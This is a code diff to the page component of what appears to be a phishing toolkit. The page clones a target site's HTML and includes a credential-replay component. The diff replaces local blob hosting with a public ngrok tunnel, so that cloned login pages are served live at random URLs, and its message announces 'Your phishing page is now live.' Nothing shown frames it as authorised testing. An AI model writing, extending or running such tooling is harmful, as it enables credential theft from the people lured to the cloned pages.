@@ -23,6 +23,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
+import { startNgrokTunnel } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -243,13 +244,20 @@ export default function PhishingPage() {
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
+    setHostedUrl(null);
     
     try {
-        const blob = new Blob([modifiedHtml], { type: 'text/html' });
-        const finalUrl = URL.createObjectURL(blob);
+      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
+      const { url } = await startNgrokTunnel();
 
+      if (url) {
+        const pageId = crypto.randomUUID();
+        const pageStorageKey = `phishing-html-${pageId}`;
+        localStorage.setItem(pageStorageKey, modifiedHtml);
+
+        const finalUrl = `${url}/phish/${pageId}`;
         setHostedUrl(finalUrl);
-        toast({ title: "Local Link Generated!", description: "Your phishing page is ready to be used." });
+        toast({ title: "Public Link Generated!", description: "Your phishing page is now live." });
 
         const urlToClone = form.getValues('urlToClone');
         logActivity({
@@ -257,6 +265,9 @@ export default function PhishingPage() {
             action: 'Generated Phishing Link',
             details: `Source: ${urlToClone || 'Pasted HTML'}`,
         });
+      } else {
+         throw new Error("Ngrok did not return a URL.");
+      }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
         toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
@@ -389,7 +400,7 @@ export default function PhishingPage() {
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                                Generate Local Link
+                                Generate Public Link
                             </Button>
                              <Dialog open={isSaveModalOpen} onOpenChange={setIsSaveModalOpen}>
                                 <DialogTrigger asChild>
